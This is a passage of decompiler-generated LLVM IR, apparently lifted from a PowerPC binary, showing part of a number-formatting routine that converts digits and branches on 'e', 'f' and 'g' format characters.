dec_label_pc_10021688:                            ; preds = %dec_label_pc_10021708.dec_label_pc_10021688_crit_edge, %dec_label_pc_10021664
  %v0_1002168c = phi i32 [ %v0_1002168c.pre, %dec_label_pc_10021708.dec_label_pc_10021688_crit_edge ], [ %v0_1002168c44, %dec_label_pc_10021664 ]
  %v3_1002168c = call %1 @__asm_cror(i32 %v0_1002168c, i32 %tmp, i32 %v0_1002168c)
  %v11_1002168c = extractvalue %1 %v3_1002168c, 7
  store i4 %v11_1002168c, i4* @cr4, align 1
  %v0_10021690 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10021690, label %dec_label_pc_100216a4, label %dec_label_pc_100216b8

dec_label_pc_100216a4:                            ; preds = %dec_label_pc_10021688
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100216b8

dec_label_pc_100216b8:                            ; preds = %dec_label_pc_10021688, %dec_label_pc_100216a4
  %storemerge2 = phi i32 [ %v1_100216b4, %dec_label_pc_100216a4 ], [ %tmp55, %dec_label_pc_10021688 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_100216c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_100216c8 = add i32 %v0_100216c8, 9
  store i32 %v1_100216c8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100216e4

dec_label_pc_100216e4:                            ; preds = %dec_label_pc_100216e4.dec_label_pc_100216e4_crit_edge, %dec_label_pc_100216b8
  %v1_100216ec = phi i32 [ %v1_100216ec.pre, %dec_label_pc_100216e4.dec_label_pc_100216e4_crit_edge ], [ %v1_100216c8, %dec_label_pc_100216b8 ]
  %v0_100216e8 = phi i32 [ %v0_100216e8.pre, %dec_label_pc_100216e4.dec_label_pc_100216e4_crit_edge ], [ 0, %dec_label_pc_100216b8 ]
  %v1_100216e4 = phi i32 [ %v1_100216e4.pre, %dec_label_pc_100216e4.dec_label_pc_100216e4_crit_edge ], [ 10, %dec_label_pc_100216b8 ]
  %v1_100216f4 = phi i32 [ %v0_100216e4.pre, %dec_label_pc_100216e4.dec_label_pc_100216e4_crit_edge ], [ %storemerge2, %dec_label_pc_100216b8 ]
  %v2_100216e4 = udiv i32 %v1_100216f4, %v1_100216e4
  store i32 %v2_100216e4, i32* %r0.global-to-local, align 4
  %v1_100216e8 = add i32 %v0_100216e8, 1
  store i32 %v1_100216e8, i32* %r8.global-to-local, align 4
  %v2_100216ec = sub i32 %v1_100216ec, %v1_100216e8
  store i32 %v2_100216ec, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_100216e4, -10
  store i32 %v2_100216e4, i32* %r10.global-to-local, align 4
  %v2_100216f4 = add i32 %v1_100216f4, 48
  %v1_100216fc = add i32 %v2_100216f4, %tmp76
  store i32 %v1_100216fc, i32* %r9.global-to-local, align 4
  %v1_10021700 = trunc i32 %v1_100216fc to i8
  %v3_10021700 = inttoptr i32 %v2_100216ec to i8*
  store i8 %v1_10021700, i8* %v3_10021700, align 1
  %v0_10021704 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021704 = add i32 %v0_10021704, -1
  store i32 %v1_10021704, i32* %ctr.global-to-local, align 4
  %v2_10021704 = icmp eq i32 %v1_10021704, 0
  br i1 %v2_10021704, label %dec_label_pc_10021708, label %dec_label_pc_100216e4.dec_label_pc_100216e4_crit_edge

dec_label_pc_100216e4.dec_label_pc_100216e4_crit_edge: ; preds = %dec_label_pc_100216e4
  %v0_100216e4.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_100216e4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_100216e8.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_100216ec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100216e4

dec_label_pc_10021708:                            ; preds = %dec_label_pc_100216e4
  %v0_10021708 = load i32, i32* %r7.global-to-local, align 4
  %v1_10021708 = icmp slt i32 %v0_10021708, 0
  %v3_10021708 = icmp eq i32 %v0_10021708, 0
  store i1 %v1_10021708, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021708, i1* %cr7_eq.global-to-local, align 1
  %v1_1002170c = add i32 %v0_10021708, 1
  store i32 %v1_1002170c, i32* %r7.global-to-local, align 4
  br i1 %v3_10021708, label %dec_label_pc_10021708.dec_label_pc_10021688_crit_edge, label %dec_label_pc_10021714

dec_label_pc_10021708.dec_label_pc_10021688_crit_edge: ; preds = %dec_label_pc_10021708
  %v0_1002168c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10021688

dec_label_pc_10021714:                            ; preds = %dec_label_pc_10021708
  %v0_10021714 = load i32, i32* %r31.global-to-local, align 4
  %v1_10021714 = icmp ult i32 %v0_10021714, 96
  %v2_10021714 = icmp ugt i32 %v0_10021714, 96
  %v3_10021714 = icmp eq i32 %v0_10021714, 96
  store i1 %v1_10021714, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021714, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10021714, label %dec_label_pc_1002172c, label %dec_label_pc_1002171c

dec_label_pc_1002171c:                            ; preds = %dec_label_pc_10021714
  %v1_10021724 = add i32 %v0_10021714, 32
  store i32 %v1_10021724, i32* %r0.global-to-local, align 4
  %v1_10021728 = urem i32 %v1_10021724, 256
  store i32 %v1_10021728, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1002172c

dec_label_pc_1002172c:                            ; preds = %dec_label_pc_10021714, %dec_label_pc_1002171c
  %v0_10021744 = phi i32 [ %v1_10021728, %dec_label_pc_1002171c ], [ %v0_10021714, %dec_label_pc_10021714 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_1002171c ], [ 101, %dec_label_pc_10021714 ]
  %v1_1002172c = icmp slt i32 %v0_10021744, 103
  %v3_1002172c = icmp eq i32 %v0_10021744, 103
  store i1 %v1_1002172c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1002172c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1002172c, label %dec_label_pc_10021734, label %dec_label_pc_10021744

dec_label_pc_10021734:                            ; preds = %dec_label_pc_1002172c
  %v0_10021734 = load i32, i32* %r30.global-to-local, align 4
  %v1_10021734 = icmp slt i32 %v0_10021734, 0
  %v3_10021734 = icmp eq i32 %v0_10021734, 0
  store i1 %v1_10021734, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021734, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021734, label %dec_label_pc_1002174c, label %dec_label_pc_1002173c

dec_label_pc_1002173c:                            ; preds = %dec_label_pc_10021734
  %v1_1002173c = add i32 %v0_10021734, -1
  store i32 %v1_1002173c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1002174c

dec_label_pc_10021744:                            ; preds = %dec_label_pc_1002172c
  %v1_10021744 = icmp slt i32 %v0_10021744, 102
  %v3_10021744 = icmp eq i32 %v0_10021744, 102
  store i1 %v1_10021744, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021744, i1* %cr7_eq.global-to-local, align 1
  %v0_10021754 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10021744, label %dec_label_pc_10021754, label %dec_label_pc_1002174c

dec_label_pc_1002174c:                            ; preds = %dec_label_pc_10021744, %dec_label_pc_10021734, %dec_label_pc_1002173c
  %v0_1002174c = phi i32 [ 0, %dec_label_pc_10021734 ], [ %v1_1002173c, %dec_label_pc_1002173c ], [ %v0_10021754, %dec_label_pc_10021744 ]
  store i32 %v0_1002174c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10021778

dec_label_pc_10021754:                            ; preds = %dec_label_pc_10021744
  %v1_10021754 = load i32, i32* %r4.global-to-local, align 4
  %v2_10021754 = add i32 %v1_10021754, %v0_10021754
  store i32 %v2_10021754, i32* %r10.global-to-local, align 4
  %v1_10021758 = icmp slt i32 %v2_10021754, -1
  %v3_10021758 = icmp eq i32 %v2_10021754, -1
  store i1 %v1_10021758, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021758, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_10021754, -2
  br i1 %tmp77, label %dec_label_pc_10021778, label %dec_label_pc_10021760

dec_label_pc_10021760:                            ; preds = %dec_label_pc_10021754
  store i32 48, i32* @r4, align 4
  %v2_10021764 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10021764, i32* @r3, align 4
  store i32 17, i32* @r5, align 4
  store i32 268572528, i32* @lr, align 4
  %v0_1002176c = call i32 @__GI_memset()
  store i32 %v0_1002176c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10021778

dec_label_pc_10021778:                            ; preds = %dec_label_pc_10021754, %dec_label_pc_1002174c, %dec_label_pc_10021760
  %v1_1002179c = phi i32 [ %v2_10021754, %dec_label_pc_10021754 ], [ %v0_1002174c, %dec_label_pc_1002174c ], [ -1, %dec_label_pc_10021760 ]
  %v1_10021778 = icmp slt i32 %v1_1002179c, 16
  %v2_10021778 = icmp sgt i32 %v1_1002179c, 16
  %v3_10021778 = icmp eq i32 %v1_1002179c, 16
  store i1 %v1_10021778, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021778, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_1002178c = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_1002178c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10021778, label %dec_label_pc_100217b4, label %dec_label_pc_10021798

dec_label_pc_10021798:                            ; preds = %dec_label_pc_10021778
  %v2_10021798 = ptrtoint i32* %stack_var_-177 to i32
  %v2_1002179c = add i32 %v1_1002179c, %v2_10021798
  store i32 %v2_1002179c, i32* %r9.global-to-local, align 4
  %v1_100217a0 = add i32 %v2_1002179c, 2
  %v2_100217a0 = inttoptr i32 %v1_100217a0 to i8*
  %v3_100217a0 = load i8, i8* %v2_100217a0, align 1
  %v4_100217a0 = zext i8 %v3_100217a0 to i32
  store i32 %v4_100217a0, i32* %r0.global-to-local, align 4
  store i32 %v1_100217a0, i32* %r11.global-to-local, align 4
  %v1_100217a8 = sub nsw i32 52, %v4_100217a0
  %v2_100217a8 = sub nuw nsw i32 -1, %v4_100217a0
  %not.v5_100217a8 = icmp ugt i32 %v1_100217a8, %v2_100217a8
  %v1_100217b0 = zext i1 %not.v5_100217a8 to i32
  store i32 %v1_100217b0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100217b4

dec_label_pc_100217b4:                            ; preds = %dec_label_pc_10021778, %dec_label_pc_10021798, %dec_label_pc_100217b4.backedge
  %v0_100217b8 = phi i32 [ %v0_100217b8.pre, %dec_label_pc_100217b4.backedge ], [ 0, %dec_label_pc_10021778 ], [ %v1_100217b0, %dec_label_pc_10021798 ]
  %v0_100217b4 = phi i32 [ %v0_100217b4.pre, %dec_label_pc_100217b4.backedge ], [ %v2_1002178c, %dec_label_pc_10021778 ], [ %v1_100217a0, %dec_label_pc_10021798 ]
  %v1_100217b4 = add i32 %v0_100217b4, -1
  %v2_100217b4 = inttoptr i32 %v1_100217b4 to i8*
  %v3_100217b4 = load i8, i8* %v2_100217b4, align 1
  %v4_100217b4 = zext i8 %v3_100217b4 to i32
  store i32 %v1_100217b4, i32* %r11.global-to-local, align 4
  %v2_100217b8 = add i32 %v4_100217b4, %v0_100217b8
  store i32 %v2_100217b8, i32* %r0.global-to-local, align 4
  %v1_100217bc = urem i32 %v2_100217b8, 256
  store i32 %v1_100217bc, i32* %r9.global-to-local, align 4
  %v1_100217c0 = trunc i32 %v2_100217b8 to i8
  store i8 %v1_100217c0, i8* %v2_100217b4, align 1
  %v0_100217c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100217c4 = icmp slt i32 %v0_100217c4, 48
  %v3_100217c4 = icmp eq i32 %v0_100217c4, 48
  store i1 %v1_100217c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100217c4, i1* %cr7_eq.global-to-local, align 1
  %v1_100217c8 = icmp ult i32 %v0_100217c4, 57
  %v2_100217c8 = icmp ugt i32 %v0_100217c4, 57
  %v3_100217c8 = icmp eq i32 %v0_100217c4, 57
  store i1 %v1_100217c8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_100217c8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_100217c8, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_100217c4, %v2_100217c8
  br i1 %brmerge, label %dec_label_pc_100217b4.backedge, label %dec_label_pc_100217d4

dec_label_pc_100217b4.backedge:                   ; preds = %dec_label_pc_100217b4
  %v0_100217b4.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_100217b8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100217b4

dec_label_pc_100217d4:                            ; preds = %dec_label_pc_100217b4
  %v2_100217d4 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_100217d4, i32* %r0.global-to-local, align 4
  %v0_100217d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_100217d8, i32* %r7.global-to-local, align 4
  %v0_100217dc = load i32, i32* %r11.global-to-local, align 4
  %v2_100217dc = icmp ult i32 %v0_100217dc, %v2_100217d4
  %v3_100217dc = icmp ugt i32 %v0_100217dc, %v2_100217d4
  %v4_100217dc = icmp eq i32 %v0_100217dc, %v2_100217d4
  store i1 %v2_100217dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100217dc, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10021668, i32* %r8.global-to-local, align 4
  br i1 %v3_100217dc, label %dec_label_pc_100217f4, label %dec_label_pc_100217e8

dec_label_pc_100217e8:                            ; preds = %dec_label_pc_100217d4
  store i32 %v2_100217d4, i32* %r8.global-to-local, align 4
  %v1_100217ec = add i32 %v0_100217d8, 1
  store i32 %v1_100217ec, i32* %r7.global-to-local, align 4
  store i32 %v2_100217d4, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100217f4

dec_label_pc_100217f4:                            ; preds = %dec_label_pc_100217d4, %dec_label_pc_100217e8
  %v2_100217fc = phi i32 [ %v0_100217dc, %dec_label_pc_100217d4 ], [ %v2_100217d4, %dec_label_pc_100217e8 ]
  %v0_100217f4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100217f4 = icmp slt i32 %v0_100217f4, 103
  %v3_100217f4 = icmp eq i32 %v0_100217f4, 103
  store i1 %v1_100217f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100217f4, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100217fc = add i32 %v2_100217fc, 1
  %v4_100217fc = inttoptr i32 %v3_100217fc to i8*
  store i8 0, i8* %v4_100217fc, align 1
  %v0_10021800 = load i32, i32* %r11.global-to-local, align 4
  %v1_10021800 = add i32 %v0_10021800, 1
  store i32 %v1_10021800, i32* %r9.global-to-local, align 4
  %v0_10021804 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10021804, label %dec_label_pc_10021808, label %dec_label_pc_1002182c

dec_label_pc_10021808:                            ; preds = %dec_label_pc_100217f4
  %v0_10021808 = load i32, i32* %r7.global-to-local, align 4
  %v1_10021808 = icmp slt i32 %v0_10021808, -4
  %v3_10021808 = icmp eq i32 %v0_10021808, -4
  store i1 %v1_10021808, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021808, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10021808, label %dec_label_pc_10021824, label %dec_label_pc_10021810

dec_label_pc_10021810:                            ; preds = %dec_label_pc_10021808
  %v1_10021810 = load i32, i32* %r10.global-to-local, align 4
  %v2_10021810 = icmp sgt i32 %v1_10021810, %v0_10021808
  %v3_10021810 = icmp slt i32 %v1_10021810, %v0_10021808
  %v4_10021810 = icmp eq i32 %v1_10021810, %v0_10021808
  store i1 %v2_10021810, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10021810, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021810, label %dec_label_pc_10021824, label %dec_label_pc_10021818

dec_label_pc_10021818:                            ; preds = %dec_label_pc_10021810
  %v2_10021818 = sub i32 %v1_10021810, %v0_10021808
  store i32 %v2_10021818, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10021844

dec_label_pc_10021824:                            ; preds = %dec_label_pc_10021810, %dec_label_pc_10021808
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10021838

dec_label_pc_1002182c:                            ; preds = %dec_label_pc_100217f4
  %v0_1002182c = load i32, i32* %r31.global-to-local, align 4
  %v1_1002182c = icmp slt i32 %v0_1002182c, 102
  %v3_1002182c = icmp eq i32 %v0_1002182c, 102
  store i1 %v1_1002182c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1002182c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1002182c, i32* %r4.global-to-local, align 4
  br i1 %v3_1002182c, label %dec_label_pc_10021844thread-pre-split, label %dec_label_pc_10021838

dec_label_pc_10021838:                            ; preds = %dec_label_pc_1002182c, %dec_label_pc_10021824
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_10021858

dec_label_pc_10021844thread-pre-split:            ; preds = %dec_label_pc_1002182c
  %v0_10021844.pr = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10021844

dec_label_pc_10021844:                            ; preds = %dec_label_pc_10021844thread-pre-split, %dec_label_pc_10021818
  %v0_10021848 = phi i32 [ %v0_10021844.pr, %dec_label_pc_10021844thread-pre-split ], [ %v0_10021808, %dec_label_pc_10021818 ]
  %v1_10021844 = icmp slt i32 %v0_10021848, 0
  %v2_10021844 = icmp sgt i32 %v0_10021848, 0
  %v3_10021844 = icmp eq i32 %v0_10021848, 0
  store i1 %v1_10021844, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10021844, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10021844, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_10021848, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_10021848, -1
  br i1 %tmp78, label %dec_label_pc_10021858, label %dec_label_pc_10021850

dec_label_pc_10021850:                            ; preds = %dec_label_pc_10021844
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_10021854 = load i32, i32* %r8.global-to-local, align 4
  %v3_10021854 = add i32 %v2_10021854, -1
  %v4_10021854 = inttoptr i32 %v3_10021854 to i8*
  store i8 48, i8* %v4_10021854, align 1
  store i32 %v3_10021854, i32* %r8.global-to-local, align 4
  %v1_10021874.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10021888.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_10021858

dec_label_pc_10021858:                            ; preds = %dec_label_pc_10021844, %dec_label_pc_10021838, %dec_label_pc_10021850
  %v0_10021888 = phi i1 [ %v1_10021844, %dec_label_pc_10021844 ], [ false, %dec_label_pc_10021838 ], [ %v0_10021888.pre, %dec_label_pc_10021850 ]
  %v1_10021874 = phi i32 [ %v1_10021800, %dec_label_pc_10021844 ], [ %v1_10021800, %dec_label_pc_10021838 ], [ %v1_10021874.pre, %dec_label_pc_10021850 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_10021864 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_10021864, i32* %r0.global-to-local, align 4
  %v0_1002186c = load i32, i32* %r8.global-to-local, align 4
  %v1_1002186c = add i32 %v0_1002186c, 1
  store i32 %v1_1002186c, i32* %r6.global-to-local, align 4
  %v2_10021874 = sub i32 %v1_10021874, %v1_1002186c
  store i32 %v2_10021874, i32* %r11.global-to-local, align 4
  %v1_10021878 = inttoptr i32 %v0_1002186c to i8*
  %v2_10021878 = load i8, i8* %v1_10021878, align 1
  %v3_10021878 = zext i8 %v2_10021878 to i32
  store i32 %v3_10021878, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_10021888, label %dec_label_pc_100218e8, label %dec_label_pc_1002188c

dec_label_pc_1002188c:                            ; preds = %dec_label_pc_10021858
  %v0_1002188c = load i32, i32* %r10.global-to-local, align 4
  %v2_1002188c = icmp slt i32 %v0_1002188c, %v2_10021874
  %v4_1002188c = icmp eq i32 %v0_1002188c, %v2_10021874
  store i1 %v2_1002188c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1002188c, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_1002188c, label %dec_label_pc_100218e0, label %dec_label_pc_100218a0

dec_label_pc_100218a0:                            ; preds = %dec_label_pc_1002188c
  %v2_100218a0 = sub i32 %v0_1002188c, %v2_10021874
  store i32 %v2_100218a0, i32* %r0.global-to-local, align 4
  %v4_100218a0 = icmp sgt i32 %v2_100218a0, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_100218a0, label %dec_label_pc_100218bc, label %dec_label_pc_100218ac

dec_label_pc_100218ac:                            ; preds = %dec_label_pc_100218a0
  %v2_100218b0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_100218b0, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10021904

dec_label_pc_100218bc:                            ; preds = %dec_label_pc_100218a0
  store i32 ptrtoint (i32* @global_var_1002f98b.1287 to i32), i32* %r9.global-to-local, align 4
  %v2_100218c8 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_100218c8, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_10021904

dec_label_pc_100218e0:                            ; preds = %dec_label_pc_1002188c
  %v0_100218e0 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_100218e0, label %dec_label_pc_100218f0, label %dec_label_pc_100218e4

dec_label_pc_100218e4:                            ; preds = %dec_label_pc_100218e0
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100218e8

dec_label_pc_100218e8:                            ; preds = %dec_label_pc_10021858, %dec_label_pc_100218e4
  %v2_100218e8 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_100218e8, i32* @r8, align 4
  br label %dec_label_pc_10021904

dec_label_pc_100218f0:                            ; preds = %dec_label_pc_100218e0
  %v2_100218f0 = sub i32 %v2_10021874, %v0_1002188c
  store i32 %v2_100218f0, i32* %r11.global-to-local, align 4
  %v2_100218f8 = add i32 %v0_1002188c, %v1_1002186c
  store i32 %v2_100218f8, i32* %r6.global-to-local, align 4
  %v2_100218fc = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_100218fc, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10021904

dec_label_pc_10021904:                            ; preds = %dec_label_pc_100218e8, %dec_label_pc_100218bc, %dec_label_pc_100218ac, %dec_label_pc_100218f0
  %v1_10021930 = phi i32 [ %v2_100218e8, %dec_label_pc_100218e8 ], [ %v2_100218c8, %dec_label_pc_100218bc ], [ %v2_100218b0, %dec_label_pc_100218ac ], [ %v2_100218fc, %dec_label_pc_100218f0 ]
  %v0_10021910 = phi i32 [ %v2_10021874, %dec_label_pc_100218e8 ], [ 0, %dec_label_pc_100218bc ], [ 0, %dec_label_pc_100218ac ], [ %v2_100218f0, %dec_label_pc_100218f0 ]
  %v3_10021904 = load i32, i32* %v2_100214d4, align 4
  store i32 %v3_10021904, i32* %r0.global-to-local, align 4
  %v1_10021908 = and i32 %v3_10021904, 16
  store i32 %v1_10021908, i32* %r9.global-to-local, align 4
  %v3_10021908 = icmp eq i32 %v1_10021908, 0
  br i1 %v3_10021908, label %dec_label_pc_10021910, label %dec_label_pc_10021928

dec_label_pc_10021910:                            ; preds = %dec_label_pc_10021904
  %v1_10021910 = icmp slt i32 %v0_10021910, 0
  %v3_10021910 = icmp eq i32 %v0_10021910, 0
  store i1 %v1_10021910, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021910, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021910, label %dec_label_pc_10021918, label %dec_label_pc_10021928

dec_label_pc_10021918:                            ; preds = %dec_label_pc_10021910
  %v0_10021918 = load i32, i32* %r31.global-to-local, align 4
  %v1_10021918 = icmp slt i32 %v0_10021918, 103
  %v3_10021918 = icmp eq i32 %v0_10021918, 103
  store i1 %v1_10021918, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021918, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021918, label %dec_label_pc_10021948, label %dec_label_pc_10021920

dec_label_pc_10021920:                            ; preds = %dec_label_pc_10021918
  %v0_10021920 = load i32, i32* %r30.global-to-local, align 4
  %v1_10021920 = icmp slt i32 %v0_10021920, 0
  %v3_10021920 = icmp eq i32 %v0_10021920, 0
  store i1 %v1_10021920, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021920, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_10021920, 1
  br i1 %tmp79, label %dec_label_pc_10021948, label %dec_label_pc_10021928

dec_label_pc_10021928:                            ; preds = %dec_label_pc_10021910, %dec_label_pc_10021904, %dec_label_pc_10021920
  %v2_10021930 = inttoptr i32 %v1_10021930 to i32*
  store i32 112, i32* %v2_10021930, align 4
  store i32 ptrtoint (i32* @global_var_1002f998.1288 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1002193c = load i32, i32* @r8, align 4
  %v2_1002193c = add i32 %v1_1002193c, 8
  %v3_1002193c = inttoptr i32 %v2_1002193c to i32*
  store i32 ptrtoint (i32* @global_var_1002f998.1288 to i32), i32* %v3_1002193c, align 4
  %v0_10021940 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021940 = load i32, i32* @r8, align 4
  %v2_10021940 = add i32 %v1_10021940, 4
  %v3_10021940 = inttoptr i32 %v2_10021940 to i32*
  store i32 %v0_10021940, i32* %v3_10021940, align 4
  %v0_10021944 = load i32, i32* @r8, align 4
  %v1_10021944 = add i32 %v0_10021944, 12
  store i32 %v1_10021944, i32* @r8, align 4
  br label %dec_label_pc_10021948

dec_label_pc_10021948:                            ; preds = %dec_label_pc_10021920, %dec_label_pc_10021918, %dec_label_pc_10021928
  %v1_10021958 = phi i32 [ %v1_10021930, %dec_label_pc_10021920 ], [ %v1_10021930, %dec_label_pc_10021918 ], [ %v1_10021944, %dec_label_pc_10021928 ]
  %v0_10021948 = load i32, i32* %r10.global-to-local, align 4
  %v1_10021948 = add i32 %v0_10021948, 1
  store i32 %v1_10021948, i32* %r10.global-to-local, align 4
  %v4_10021948 = icmp eq i32 %v1_10021948, 0
  br i1 %v4_10021948, label %dec_label_pc_10021970, label %dec_label_pc_10021950

dec_label_pc_10021950:                            ; preds = %dec_label_pc_10021948
  %v1_10021950 = sub i32 -1, %v0_10021948
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10021958 = add i32 %v1_10021958, 4
  %v3_10021958 = inttoptr i32 %v2_10021958 to i32*
  store i32 %v1_10021950, i32* %v3_10021958, align 4
  store i32 ptrtoint (i32* @global_var_1002f98b.1287 to i32), i32* %r9.global-to-local, align 4
  %v0_10021964 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021964 = load i32, i32* @r8, align 4
  %v2_10021964 = inttoptr i32 %v1_10021964 to i32*
  store i32 %v0_10021964, i32* %v2_10021964, align 4
  %v0_10021968 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021968 = load i32, i32* @r8, align 4
  %v2_10021968 = add i32 %v1_10021968, 8
  %v3_10021968 = inttoptr i32 %v2_10021968 to i32*
  store i32 %v0_10021968, i32* %v3_10021968, align 4
  %v0_1002196c = load i32, i32* @r8, align 4
  %v1_1002196c = add i32 %v0_1002196c, 12
  store i32 %v1_1002196c, i32* @r8, align 4
  br label %dec_label_pc_10021970

dec_label_pc_10021970:                            ; preds = %dec_label_pc_10021948, %dec_label_pc_10021950
  %v1_1002197c = phi i32 [ %v1_10021958, %dec_label_pc_10021948 ], [ %v1_1002196c, %dec_label_pc_10021950 ]
  %v0_10021970 = load i32, i32* %r11.global-to-local, align 4
  %v1_10021970 = icmp slt i32 %v0_10021970, 0
  %v3_10021970 = icmp eq i32 %v0_10021970, 0
  store i1 %v1_10021970, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021970, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021970, label %dec_label_pc_1002198c, label %dec_label_pc_10021978

dec_label_pc_10021978:                            ; preds = %dec_label_pc_10021970
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_1002197c = load i32, i32* %r6.global-to-local, align 4
  %v2_1002197c = add i32 %v1_1002197c, 8
  %v3_1002197c = inttoptr i32 %v2_1002197c to i32*
  store i32 %v0_1002197c, i32* %v3_1002197c, align 4
  %v0_10021980 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021980 = load i32, i32* @r8, align 4
